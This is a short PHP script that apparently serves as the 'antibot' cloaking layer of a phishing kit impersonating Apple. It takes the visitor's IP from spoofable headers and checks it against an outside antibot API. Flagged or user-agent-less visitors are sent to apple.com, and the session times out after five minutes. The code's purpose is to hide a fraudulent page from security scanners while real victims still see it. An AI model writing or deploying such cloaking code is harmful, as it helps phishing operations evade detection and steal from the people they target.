<?php
session_start();
function ipaddress(){
	$ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}
function antibot($ip,$key){
	$antibot = file_get_contents("http://rest-api.web.id/api.php?ip=$ip&key=$key");
	$decode = json_decode($antibot);
	if($decode->blocked == true){
		header('Location: http://apple.com/');
		die();
	}
}
$key='demo-antibot';
if(!isset($_SERVER['HTTP_USER_AGENT'])){
	header('Location: http://apple.com/');
    session_destroy();
	die();
	
}
if(!isset($_SESSION['start'])){
	$_SESSION['start'] = time();
	antibot(ipaddress(),$key);
}
$_SESSION['expire'] = $_SESSION['start'] + (5 * 60);
$now = time();
if ($now > $_SESSION['expire']) {
session_destroy();
}